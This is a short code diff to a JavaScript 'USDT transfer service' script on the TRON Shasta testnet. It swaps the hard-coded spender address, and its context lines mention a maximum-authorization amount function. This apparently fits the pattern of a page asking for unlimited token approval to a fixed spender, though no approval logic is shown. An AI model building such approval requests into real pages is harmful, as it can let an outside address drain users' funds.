@@ -2,7 +2,7 @@
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
-const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";
+const spenderAddress = "TAmgNT7gLX7TuSKcKLuzPPDDpKZ8UMkYGv";
 
 // ====== 最大授权额度 ======
 function getLargeEnoughAmount() {
@@ -139,3 +139,4 @@ window.addEventListener("DOMContentLoaded", () => {
 });
 
 console.log("USDT 转账服务脚本加载完成");
+
